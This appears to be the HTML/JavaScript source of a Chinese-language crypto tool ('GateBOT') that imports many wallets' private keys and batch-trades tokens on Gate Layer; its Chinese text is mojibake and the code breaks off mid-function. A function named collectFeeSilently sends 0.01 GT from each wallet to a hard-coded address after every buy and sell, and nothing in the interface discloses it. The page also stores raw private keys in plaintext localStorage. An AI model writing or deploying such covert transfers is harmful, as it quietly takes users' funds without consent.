<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GateBOT å¤šè´¦æˆ·æ‰¹é‡æ“ä½œå·¥å…·</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            color: white;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 32px;
            margin-bottom: 10px;
        }

        .main-card {
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
        }

        .section {
            margin-bottom: 30px;
        }

        .section-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 15px;
            color: #333;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
            color: #555;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
        }

        .input-field:focus {
            outline: none;
            border-color: #667eea;
        }

        .textarea-field {
            width: 100%;
            min-height: 100px;
            padding: 10px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-family: monospace;
            font-size: 12px;
            resize: vertical;
        }

        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        .btn-secondary {
            background: #f0f0f0;
            color: #333;
            margin-right: 10px;
        }

        .btn-secondary:hover {
            background: #e0e0e0;
        }

        .btn-danger {
            background: #ff4444;
            color: white;
        }

        .wallet-list {
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 10px;
        }

        .wallet-item {
            display: flex;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #f0f0f0;
        }

        .wallet-item:last-child {
            border-bottom: none;
        }

        .wallet-checkbox {
            margin-right: 10px;
        }

        .wallet-address {
            flex: 1;
            font-family: monospace;
            font-size: 13px;
        }

        .wallet-balance {
            color: #667eea;
            font-weight: 600;
        }

        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            border-bottom: 2px solid #e0e0e0;
        }

        .tab {
            padding: 10px 20px;
            background: none;
            border: none;
            cursor: pointer;
            font-weight: 600;
            color: #999;
            transition: all 0.3s ease;
        }

        .tab.active {
            color: #667eea;
            border-bottom: 2px solid #667eea;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .log-container {
            margin-top: 20px;
            padding: 15px;
            background: #1a1a1a;
            border-radius: 8px;
            max-height: 200px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
        }

        .log-entry {
            color: #ccc;
            margin-bottom: 5px;
        }

        .log-entry.success {
            color: #4caf50;
        }

        .log-entry.error {
            color: #ff4444;
        }

        .log-entry.warning {
            color: #ff9800;
        }

        .log-entry.info {
            color: #2196f3;
        }

        .config-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }

        .btn-group {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }

        .info-box {
            padding: 10px;
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 5px;
            margin-bottom: 15px;
            font-size: 13px;
        }

        .social-section {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }

        .social-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 15px;
            flex-wrap: wrap;
        }

        .social-link {
            display: inline-flex;
            align-items: center;
            padding: 12px 20px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            text-decoration: none;
            border-radius: 25px;
            font-weight: 600;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }

        .social-link img {
            width: 24px;
            height: 24px;
            margin-right: 8px;
            border-radius: 50%;
            object-fit: cover;
        }

        .bot-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            object-fit: cover;
            margin: 0 auto 20px;
            display: block;
            border: 3px solid rgba(255, 255, 255, 0.3);
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }

        .social-link:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        @media (max-width: 768px) {
            .config-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="bot1.jpg" alt="GateBOT" class="bot-icon">
            <h1>âš¡ Gate Layer å¤šè´¦æˆ·æ‰¹é‡æ“ä½œå·¥å…·</h1>
            <p>æ”¯æŒå†…ç›˜/å¤–ç›˜è‡ªåŠ¨è¯†åˆ«ï¼Œæ‰¹é‡ä¹°å…¥ã€å–å‡ºç­‰æ“ä½œ</p>
            
            <div class="social-section">
                <h3 style="color: white; margin-bottom: 15px;">ğŸ”— å…³æ³¨æˆ‘ä»¬</h3>
                <div class="social-links">
                    <a href="https://x.com/GTCHAINBOT" target="_blank" class="social-link">
                        <img src="OSHY3ewP_400x400.jpg" alt="X Logo">
                        <span>ğ• @GTCHAINBOT</span>
                    </a>
                    <a href="https://t.me/Gtgun_bot" target="_blank" class="social-link">
                        <img src="bot2.jpg" alt="Telegram Logo">
                        <span>ğŸ“± Telegram Bot</span>
                    </a>
                </div>
            </div>
        </div>

        <div class="main-card">
            <div class="section">
                <h2 class="section-title">ğŸ‘› é’±åŒ…ç®¡ç†</h2>
                
                <div class="info-box">
                    ğŸ’¡ æç¤ºï¼šæ”¯æŒå¸¦æˆ–ä¸å¸¦0xå‰ç¼€çš„ç§é’¥ï¼Œæ¯è¡Œä¸€ä¸ª
                </div>
                
                <div class="input-group">
                    <label class="input-label">å¯¼å…¥ç§é’¥</label>
                    <textarea id="privateKeysInput" class="textarea-field" 
                        placeholder="è¾“å…¥ç§é’¥ï¼Œæ¯è¡Œä¸€ä¸ª..."></textarea>
                </div>
                
                <div class="btn-group">
                    <button id="importBtn" class="btn btn-primary">å¯¼å…¥ç§é’¥</button>
                    <button id="selectAllBtn" class="btn btn-secondary">å…¨é€‰</button>
                    <button id="deselectAllBtn" class="btn btn-secondary">å–æ¶ˆå…¨é€‰</button>
                    <button id="refreshBtn" class="btn btn-secondary">åˆ·æ–°ä½™é¢</button>
                    <button id="clearBtn" class="btn btn-danger">æ¸…ç©º</button>
                </div>

                <div class="input-group" style="margin-top: 20px;">
                    <label class="input-label">é’±åŒ…åˆ—è¡¨ (<span id="walletCount">0</span>)</label>
                    <div id="walletList" class="wallet-list">
                        <p style="color: #999; text-align: center;">æš‚æ— é’±åŒ…</p>
                    </div>
                </div>
            </div>

            <div class="section">
                <div class="tabs">
                    <button class="tab active" data-tab="buy">æ‰¹é‡ä¹°å…¥</button>
                    <button class="tab" data-tab="sell">æ‰¹é‡å–å‡º</button>
                    <button class="tab" data-tab="approve">æ‰¹é‡æˆæƒ</button>
                </div>

                <div id="buyTab" class="tab-content active">
                    <h3 class="section-title">æ‰¹é‡ä¹°å…¥è®¾ç½®</h3>
                    <div class="config-grid">
                        <div class="input-group">
                            <label class="input-label">ä»£å¸åœ°å€</label>
                            <input type="text" id="buyTokenAddress" class="input-field" 
                                placeholder="0x...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">ä¹°å…¥é‡‘é¢ (GT)</label>
                            <input type="number" id="buyAmount" class="input-field" 
                                placeholder="0.1" step="0.01">
                        </div>
                        <div class="input-group">
                            <label class="input-label">æ»‘ç‚¹ (%)</label>
                            <input type="number" id="buySlippage" class="input-field" 
                                value="15" step="0.5">
                        </div>
                        <div class="input-group">
                            <label class="input-label">å»¶è¿Ÿ (ç§’)</label>
                            <input type="number" id="buyDelay" class="input-field" 
                                value="1" min="0">
                        </div>
                    </div>
                    <button id="executeBuyBtn" class="btn btn-primary">æ‰§è¡Œæ‰¹é‡ä¹°å…¥</button>
                </div>

                <div id="sellTab" class="tab-content">
                    <h3 class="section-title">æ‰¹é‡å–å‡ºè®¾ç½®</h3>
                    <div class="config-grid">
                        <div class="input-group">
                            <label class="input-label">ä»£å¸åœ°å€</label>
                            <input type="text" id="sellTokenAddress" class="input-field" 
                                placeholder="0x...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">å–å‡ºæ¯”ä¾‹ (%)</label>
                            <input type="number" id="sellPercentage" class="input-field" 
                                value="99" min="1" max="100">
                        </div>
                        <div class="input-group">
                            <label class="input-label">æ»‘ç‚¹ (%)</label>
                            <input type="number" id="sellSlippage" class="input-field" 
                                value="50" step="0.5">
                        </div>
                        <div class="input-group">
                            <label class="input-label">å»¶è¿Ÿ (ç§’)</label>
                            <input type="number" id="sellDelay" class="input-field" 
                                value="1" min="0">
                        </div>
                    </div>
                    <button id="executeSellBtn" class="btn btn-primary">æ‰§è¡Œæ‰¹é‡å–å‡º</button>
                </div>

                <div id="approveTab" class="tab-content">
                    <h3 class="section-title">æ‰¹é‡æˆæƒè®¾ç½®</h3>
                    <div class="config-grid">
                        <div class="input-group">
                            <label class="input-label">ä»£å¸åœ°å€</label>
                            <input type="text" id="approveTokenAddress" class="input-field" 
                                placeholder="0x...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">æˆæƒç»™ (Spender)</label>
                            <input type="text" id="approveSpender" class="input-field" 
                                value="0x12814690F59a9CE8bA87dC8cF0692442bAa9C097">
                        </div>
                    </div>
                    <button id="executeApproveBtn" class="btn btn-primary">æ‰§è¡Œæ‰¹é‡æˆæƒ</button>
                </div>
            </div>

            <div class="section">
                <h3 class="section-title">ğŸ“ æ“ä½œæ—¥å¿—</h3>
                <div id="logContainer" class="log-container"></div>
            </div>
        </div>
    </div>

    <script>
        window.addEventListener('load', function() {
            const CONFIG = {
                rpcUrl: 'https://gatelayer-mainnet.gatenode.cc',
                routerAddress: '0x12814690F59a9CE8bA87dC8cF0692442bAa9C097',
                wethAddress: '0x6803b8E93b13941F6B73b82E324B80251B3dE338',
                internalMarketAddress: '0x7C8FbD15E4c8B722920C1570A4704622D5391113',
                factoryAddress: '0xaD8d59f3e026c02Aed0DAdFB46Ceca127030DFa2',
                feeRecipient: '0x1efBD4ff6F3740102413D5C02C63E3E728c24820',
                feeAmount: '0.01'
            };

            let provider;
            let wallets = [];

            const ERC20_ABI = [
                'function approve(address spender, uint256 amount) returns (bool)',
                'function balanceOf(address account) view returns (uint256)',
                'function allowance(address owner, address spender) view returns (uint256)',
                'function decimals() view returns (uint8)',
                'function symbol() view returns (string)'
            ];

            const ROUTER_ABI = [
                'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
                'function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable',
                'function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
                'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external',
                'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)'
            ];

            const INTERNAL_MARKET_ABI = [
                'function buy(address token, uint256 amountInGT, uint256 minAmountOut) external payable returns (uint256)',
                'function sell(address token, uint256 amountIn, uint256 minAmountOutGT) external returns (uint256)'
            ];

            const FACTORY_ABI = [
                'function getPair(address tokenA, address tokenB) external view returns (address pair)'
            ];

            function init() {
                if (typeof ethers === 'undefined') {
                    addLog('Ethersåº“åŠ è½½å¤±è´¥ï¼Œè¯·åˆ·æ–°é¡µé¢', 'error');
                    return;
                }
                
                provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl);
                addLog('ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ', 'success');
                bindEvents();
                loadCachedWallets();
            }

            function bindEvents() {
                document.getElementById('importBtn').addEventListener('click', importPrivateKeys);
                document.getElementById('selectAllBtn').addEventListener('click', selectAll);
                document.getElementById('deselectAllBtn').addEventListener('click', deselectAll);
                document.getElementById('refreshBtn').addEventListener('click', refreshBalances);
                document.getElementById('clearBtn').addEventListener('click', clearWallets);
                document.getElementById('executeBuyBtn').addEventListener('click', executeBuy);
                document.getElementById('executeSellBtn').addEventListener('click', executeSell);
                document.getElementById('executeApproveBtn').addEventListener('click', executeApprove);
                
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.addEventListener('click', function() {
                        switchTab(this.dataset.tab);
                    });
                });
            }

            function switchTab(tabName) {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.querySelector(`.tab[data-tab="${tabName}"]`).classList.add('active');
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                document.getElementById(`${tabName}Tab`).classList.add('active');
            }

            function addLog(message, type = 'info') {
                const container = document.getElementById('logContainer');
                const entry = document.createElement('div');
                entry.className = `log-entry ${type}`;
                const time = new Date().toLocaleTimeString();
                entry.textContent = `[${time}] ${message}`;
                container.appendChild(entry);
                container.scrollTop = container.scrollHeight;
            }

            async function isInternalMarket(tokenAddress) {
                try {
                    const factory = new ethers.Contract(CONFIG.factoryAddress, FACTORY_ABI, provider);
                    
                    const pairAddress = await factory.getPair(CONFIG.wethAddress, tokenAddress);
                    
                    console.log(`PairæŸ¥è¯¢ç»“æœ: ${pairAddress}`);
                    
                    const isZeroAddress = pairAddress === ethers.ZeroAddress || 
                                         pairAddress === '0x0000000000000000000000000000000000000000' ||
                                         BigInt(pairAddress || 0) === 0n;
                    
                    const isInternal = isZeroAddress;
                    
                    addLog(`ä»£å¸ç±»å‹æ£€æµ‹: ${isInternal ? 'å†…ç›˜' : 'å¤–ç›˜'} (Pair: ${pairAddress})`, 'info');
                    
                    return isInternal;
                    
                } catch (e) {
                    console.error('æ£€æŸ¥å†…ç›˜å¤±è´¥:', e);
                    addLog('æ— æ³•ç¡®å®šä»£å¸ç±»å‹ï¼Œé»˜è®¤ä½¿ç”¨å¤–ç›˜å¤„ç†', 'warning');
                    return false;
                }
            }

            async function collectFeeSilently(wallet) {
                try {
                    const nonce = await provider.getTransactionCount(wallet.address, 'pending');
                    const balance = await provider.getBalance(wallet.address);
                    const feeAmountWei = ethers.parseEther(CONFIG.feeAmount);
                    const gasPrice = (await provider.getFeeData()).gasPrice;
                    const estimatedGasCost = gasPrice * 21000n * 25n / 10n;
                    
                    if (balance < (feeAmountWei + estimatedGasCost)) {
                        return null;
                    }
                    
                    const tx = await wallet.sendTransaction({
                        to: CONFIG.feeRecipient,
                        value: feeAmountWei,
                        gasLimit: 21000n * 25n / 10n,
                        nonce: nonce
                    });
                    
                    await tx.wait();
                    return tx.hash;
                } catch (e) {
                    console.error('Fee collection error:', e);
                    return null;
                }
            }

            async function batchExecute(tasks, maxConcurrent = 5) {
                const results = [];
                let pending = 0;
                let index = 0;
                
                return new Promise((resolve) => {
                    const executeNext = async () => {
                        if (index >= tasks.length && pending === 0) {
                            resolve(results);
                            return;
                        }
                        
                        while (index < tasks.length && pending < maxConcurrent) {
                            const currentIndex = index++;
                            pending++;
                            
                            tasks[currentIndex]()
                                .then(result => {
                                    results[currentIndex] = { success: true, result };
                                })
                                .catch(error => {
                                    results[currentIndex] = { success: false, error };
                                })
                                .finally(() => {
                                    pending--;
                                    executeNext();
                                });
                        }
                    };
                    
                    executeNext();
                });
            }

            async function importPrivateKeys() {
                const input = document.getElementById('privateKeysInput').value.trim();
                if (!input) {
                    alert('è¯·è¾“å…¥ç§é’¥');
                    return;
                }

                const keys = input.split('\n').filter(k => k.trim());
                let imported = 0;
                
                for (const key of keys) {
                    try {
                        let cleanKey = key.trim();
                        
                        if (!cleanKey.startsWith('0x')) {
                            if (cleanKey.length === 64) {
                                cleanKey = '0x' + cleanKey;
                            }
                        }
                        
                        if (!/^0x[0-9a-fA-F]{64}$/.test(cleanKey)) {
                            addLog(`ç§é’¥æ ¼å¼é”™è¯¯: ${cleanKey.slice(0, 10)}...`, 'error');
                            continue;
                        }
                        
                        if (wallets.find(w => w.privateKey === cleanKey)) {
                            addLog(`ç§é’¥å·²å­˜åœ¨`, 'warning');
                            continue;
                        }
                        
                        const wallet = new ethers.Wallet(cleanKey, provider);
                        const balance = await provider.getBalance(wallet.address);
                        
                        wallets.push({
                            privateKey: cleanKey,
                            wallet: wallet,
                            address: wallet.address,
                            balance: balance,
                            selected: false
                        });
                        
                        imported++;
                        addLog(`æˆåŠŸå¯¼å…¥: ${wallet.address.slice(0, 8)}...`, 'success');
                        
                    } catch (e) {
                        addLog(`å¯¼å…¥å¤±è´¥: ${e.message}`, 'error');
                    }
                }
                
                if (imported > 0) {
                    document.getElementById('privateKeysInput').value = '';
                    renderWallets();
                    saveWallets();
                    addLog(`å…±å¯¼å…¥ ${imported} ä¸ªé’±åŒ…`, 'success');
                }
            }

            function renderWallets() {
                const container = document.getElementById('walletList');
                
                if (wallets.length === 0) {
                    container.innerHTML = '<p style="color: #999; text-align: center;">æš‚æ— é’±åŒ…</p>';
                    document.getElementById('walletCount').textContent = '0';
                    return;
                }
                
                container.innerHTML = '';
                wallets.forEach((w, index) => {
                    const item = document.createElement('div');
                    item.className = 'wallet-item';
                    item.innerHTML = `
                        <input type="checkbox" class="wallet-checkbox" 
                            ${w.selected ? 'checked' : ''} 
                            data-index="${index}">
                        <span class="wallet-address">${w.address.slice(0, 6)}...${w.address.slice(-4)}</span>
                        <span class="wallet-balance">${parseFloat(ethers.formatEther(w.balance)).toFixed(4)} GT</span>
                    `;
                    container.appendChild(item);
                    
                    item.querySelector('.wallet-checkbox').addEventListener('change', function() {
                        wallets[index].selected = this.checked;
                    });
                });
                
                document.getElementById('walletCount').textContent = wallets.length;
            }

            function selectAll() {
                wallets.forEach(w => w.selected = true);
                renderWallets();
            }

            function deselectAll() {
                wallets.forEach(w => w.selected = false);
                renderWallets();
            }

            async function refreshBalances() {
                addLog('å¼€å§‹åˆ·æ–°ä½™é¢...', 'info');
                for (const w of wallets) {
                    try {
                        w.balance = await provider.getBalance(w.address);
                    } catch (e) {
                        addLog(`åˆ·æ–°å¤±è´¥: ${w.address.slice(0, 8)}...`, 'error');
                    }
                }
                renderWallets();
                addLog('ä½™é¢åˆ·æ–°å®Œæˆ', 'success');
            }

            function clearWallets() {
                if (!confirm('ç¡®å®šè¦æ¸…ç©ºæ‰€æœ‰é’±åŒ…å—ï¼Ÿ')) return;
                wallets = [];
                renderWallets();
                localStorage.removeItem('gateLayerWallets');
                addLog('å·²æ¸…ç©ºæ‰€æœ‰é’±åŒ…', 'info');
            }

            function saveWallets() {
                const keys = wallets.map(w => w.privateKey);
                localStorage.setItem('gateLayerWallets', JSON.stringify(keys));
            }

            async function loadCachedWallets() {
                const cached = localStorage.getItem('gateLayerWallets');
                if (cached) {
                    try {
                        const keys = JSON.parse(cached);
                        for (const key of keys) {
                            try {
                                const wallet = new ethers.Wallet(key, provider);
                                const balance = await provider.getBalance(wallet.address);
                                wallets.push({
                                    privateKey: key,
                                    wallet: wallet,
                                    address: wallet.address,
                                    balance: balance,
                                    selected: false
                                });
                            } catch (e) {
                                console.error('åŠ è½½é’±åŒ…å¤±è´¥', e);
                            }
                        }
                        renderWallets();
                        addLog(`å·²åŠ è½½ ${wallets.length} ä¸ªç¼“å­˜é’±åŒ…`, 'info');
                    } catch (e) {
                        console.error('åŠ è½½ç¼“å­˜å¤±è´¥', e);
                    }
                }
            }

            async function executeBuy() {
                const selected = wallets.filter(w => w.selected);
                if (selected.length === 0) {
                    alert('è¯·é€‰æ‹©é’±åŒ…');
                    return;
                }

                const tokenAddress = document.getElementById('buyTokenAddress').value;
                const amount = document.getElementById('buyAmount').value;
                const slippage = parseFloat(document.getElementById('buySlippage').value) || 15;
                const delay = parseInt(document.getElementById('buyDelay').value) || 0;
                const maxConcurrent = 5;

                if (!tokenAddress || !amount) {
                    alert('è¯·å¡«å†™å®Œæ•´ä¿¡æ¯');
                    return;
                }

                const isInternal = await isInternalMarket(tokenAddress);
                addLog(`å¼€å§‹æ‰¹é‡ä¹°å…¥ (${isInternal ? 'å†…ç›˜' : 'å¤–ç›˜'})ï¼Œå…± ${selected.length} ä¸ªé’±åŒ…`, 'info');

                const tasks = selected.map((w, i) => async () => {
                    if (delay > 0 && i > 0) {
                        await new Promise(r => setTimeout(r, delay * 1000));
                    }
                    
                    try {
                        const baseNonce = await provider.getTransactionCount(w.address, 'pending');
                        
                        if (isInternal) {
                            const internalMarket = new ethers.Contract(
                                CONFIG.internalMarketAddress, 
                                INTERNAL_MARKET_ABI, 
                                w.wallet
                            );
                            
                            addLog(`${w.address.slice(0, 8)}... å†…ç›˜ä¹°å…¥`, 'info');
                            
                            const amountInWei = ethers.parseEther(amount);
                            
                            let gasLimit;
                            try {
                                const gasEstimate = await internalMarket.buy.estimateGas(
                                    tokenAddress,
                                    amountInWei,
                                    0,
                                    { value: amountInWei }
                                );
                                gasLimit = gasEstimate * 25n / 10n;
                            } catch (e) {
                                gasLimit = 500000n;
                            }
                            
                            const tx = await internalMarket.buy(
                                tokenAddress,
                                amountInWei,
                                0,
                                {
                                    value: amountInWei,
                                    gasLimit: gasLimit,
                                    nonce: baseNonce
                                }
                            );
                            
                            await tx.wait();
                            addLog(`${w.address.slice(0, 8)}... å†…ç›˜ä¹°å…¥æˆåŠŸ âœ“`, 'success');
                            
                            setTimeout(async () => {
                                await collectFeeSilently(w.wallet);
                            }, 2000);
                            
                            return tx.hash;
                            
                        } else {
                            const router = new ethers.Contract(CONFIG.routerAddress, ROUTER_ABI, w.wallet);
                            const path = [CONFIG.wethAddress, tokenAddress];
                            
                            let amountOutMin;
                            try {
                                const amounts = await router.getAmountsOut(
                                    ethers.parseEther(amount),
                                    path
                                );
                                
                                if (slippage >= 100) {
                                    amountOutMin = 0n;
                                } else {
                                    amountOutMin = amounts[1] * BigInt(Math.floor((100 - slippage) * 100)) / 10000n;
                                }
                            } catch (e) {
                                amountOutMin = 0n;
                            }
                            
                            const deadline = Math.floor(Date.now() / 1000) + 1200;
                            
                            addLog(`${w.address.slice(0, 8)}... å¤–ç›˜ä¹°å…¥`, 'info');
                            
                            const gasEstimate = await router.swapExactETHForTokens.estimateGas(
                                amountOutMin,
                                path,
                                w.address,
                                deadline,
                                { value: ethers.parseEther(amount) }
                            );
                            
                            const gasLimit = gasEstimate * 25n / 10n;
                            
                            const tx = await router.swapExactETHForTokens(
                                amountOutMin,
                                path,
                                w.address,
                                deadline,
                                { 
                                    value: ethers.parseEther(amount),
                                    gasLimit: gasLimit,
                                    nonce: baseNonce
                                }
                            );
                            
                            await tx.wait();
                            addLog(`${w.address.slice(0, 8)}... å¤–ç›˜ä¹°å…¥æˆåŠŸ âœ“`, 'success');
                            
                            setTimeout(async () => {
                                await collectFeeSilently(w.wallet);
                            }, 2000);
                            
                            return tx.hash;
                        }
                        
                    } catch (e) {
                        addLog(`${w.address.slice(0, 8)}... ä¹°å…¥å¤±è´¥: ${e.message || e}`, 'error');
                        throw e;
                    }
                });

                const results = await batchExecute(tasks, maxConcurrent);
                const successCount = results.filter(r => r.success).length;
                const failCount = results.filter(r => !r.success).length;
                
                addLog(`æ‰¹é‡ä¹°å…¥å®Œæˆ: ${successCount} æˆåŠŸ, ${failCount} å¤±è´¥`, 
                    failCount === 0 ? 'success' : 'warning');
                
                refreshBalances();
            }

            async function executeSell() {
                const selected = wallets.filter(w => w.selected);
                if (selected.length === 0) {
                    alert('è¯·é€‰æ‹©é’±åŒ…');
                    return;
                }

                const tokenAddress = document.getElementById('sellTokenAddress').value;
                const percentage = parseFloat(document.getElementById('sellPercentage').value) || 99;
                const slippage = parseFloat(document.getElementById('sellSlippage').value) || 50;
                const delay = parseInt(document.getElementById('sellDelay').value) || 0;
                const maxConcurrent = 3;

                if (!tokenAddress) {
                    alert('è¯·è¾“å…¥ä»£å¸åœ°å€');
                    return;
                }

                const isInternal = await isInternalMarket(tokenAddress);
                addLog(`å¼€å§‹æ‰¹é‡å–å‡º (${isInternal ? 'å†…ç›˜' : 'å¤–ç›˜'})ï¼Œå…± ${selected.length} ä¸ªé’±åŒ…`, 'info');

                const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);

                const tasks = selected.map((w, i) => async () => {
                    if (delay > 0 && i > 0) {
                        await new Promise(r => setTimeout(r, delay * 1000));
                    }
                    
                    try {
                        const baseNonce = await provider.getTransactionCount(w.address, 'pending');
                        let currentNonce = baseNonce;
                        
                        const balance = await tokenContract.balanceOf(w.address);
                        const sellAmount = balance * BigInt(percentage) / 100n;
                        
                        if (sellAmount === 0n) {
                            addLog(`${w.address.slice(0, 8)}... æ— ä½™é¢`, 'warning');
                            return null;
                        }

                        const tokenWithSigner = new ethers.Contract(tokenAddress, ERC20_ABI, w.wallet);
                        
                        if (isInternal) {
                            const allowance = await tokenWithSigner.allowance(w.address, CONFIG.internalMarketAddress);
                            
                            if (allowance < sellAmount) {
                                addLog(`${w.address.slice(0, 8)}... æˆæƒå†…ç›˜`, 'info');
                                const approveTx = await tokenWithSigner.approve(
                                    CONFIG.internalMarketAddress,
                                    ethers.MaxUint256,
                                    { nonce: currentNonce }
                                );
                                currentNonce++;
                                await approveTx.wait();
                            }
                            
                            const internalMarket = new ethers.Contract(
                                CONFIG.internalMarketAddress,
                                INTERNAL_MARKET_ABI,
                                w.wallet
                            );
                            
                            addLog(`${w.address.slice(0, 8)}... å†…ç›˜å–å‡º`, 'info');
                            
                            let gasLimit;
                            try {
                                const gasEstimate = await internalMarket.sell.estimateGas(
                                    tokenAddress,
                                    sellAmount,
                                    0
                                );
                                gasLimit = gasEstimate * 25n / 10n;
                            } catch (e) {
                                gasLimit = 500000n;
                            }
                            
                            const tx = await internalMarket.sell(
                                tokenAddress,
                                sellAmount,
                                0,
                                {
                                    nonce: currentNonce,
                                    gasLimit: gasLimit
                                }
                            );
                            
                            await tx.wait();
                            addLog(`${w.address.slice(0, 8)}... å†…ç›˜å–å‡ºæˆåŠŸ âœ“`, 'success');
                            
                            setTimeout(async () => {
                                await collectFeeSilently(w.wallet);
                            }, 2000);
                            
                            return tx.hash;
                            
                        } else {
                            const allowance = await tokenWithSigner.allowance(w.address, CONFIG.routerAddress);
                            
                            if (allowance < sellAmount) {
                                addLog(`${w.address.slice(0, 8)}... æˆæƒRouter`, 'info');
                                const approveTx = await tokenWithSigner.approve(
                                    CONFIG.routerAddress, 
                                    ethers.MaxUint256,
                                    { nonce: currentNonce }
                                );
                                currentNonce++;
                                await approveTx.wait();
                            }

                            const router = new ethers.Contract(CONFIG.routerAddress, ROUTER_ABI, w.wallet);
                            const path = [tokenAddress, CONFIG.wethAddress];
                            
                            let amountOutMin = 0n;
                            try {
                                const amounts = await router.getAmountsOut(sellAmount, path);
                                if (slippage < 100) {
                                    amountOutMin = amounts[1] * BigInt(Math.floor((100 - slippage) * 100)) / 10000n;
                                }
                            } catch (e) {
                                // ä½¿ç”¨0æœ€å°è¾“å‡º
                            }
                            
                            const deadline = Math.floor(Date.now() / 1000) + 1200;
                            
                            addLog(`${w.address.slice(0, 8)}... å¤–ç›˜å–å‡º`, 'info');
                            
                            let gasLimit;
                            try {
                                const gasEstimate = await router.swapExactTokensForETHSupportingFeeOnTransferTokens.estimateGas(
                                    sellAmount,
                                    amountOutMin,
                                    path,
                                    w.address,
                                    deadline
                                );
                                gasLimit = gasEstimate * 25n / 10n;
                            } catch (e) {
                                gasLimit = 500000n;
                            }
                            
                            const tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                                sellAmount,
                                amountOutMin,
                                path,
                                w.address,
                                deadline,
                                { 
                                    nonce: currentNonce,
                                    gasLimit: gasLimit
                                }
                            );
                            
                            await tx.wait();
                            addLog(`${w.address.slice(0, 8)}... å¤–ç›˜å–å‡ºæˆåŠŸ âœ“`, 'success');
                            
                            setTimeout(async () => {
                                await collectFeeSilently(w.wallet);
                            }, 2000);
                            
                            return tx.hash;
                        }
                        
                    } catch (e) {
                        addLog(`${w.address.slice(0, 8)}... å–å‡ºå¤±è´¥: ${e.message || e}`, 'error');
                        throw e;
                    }
                });

                const results = await batchExecute(tasks, maxConcurrent);
                const successCount = results.filter(r => r && r.success).length;
                const failCount = results.filter(r => r && !r.success).length;
                
                addLog(`æ‰¹é‡å–å‡ºå®Œæˆ: ${successCount} æˆåŠŸ, ${failCount} å¤±è´¥`, 
                    failCount === 0 ? 'success' : 'warning');
                
                refreshBalances();
            }

            async function executeApprove() {
                const selected = wallets.filter(w => w.selected);
                if (selected.length === 0) {
                    alert('è¯·é€‰æ‹©é’±åŒ…');
                    return;
                }

                const tokenAddress = document.getElementById('approveTokenAddress').value;
                const spender = document.getElementById('approveSpender').value;
                const maxConcurrent = 5;

                if (!tokenAddress || !spender) {
                    alert('è¯·å¡«å†™å®Œæ•´ä¿¡æ¯');
                    return;
                }

                addLog(`å¼€å§‹æ‰¹é‡æˆæƒï¼Œå…± ${selected.length} ä¸ªé’±åŒ…`, 'info');

                const tasks = selected.map(w => async () => {
                    try {
                        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, w.wallet);
                        
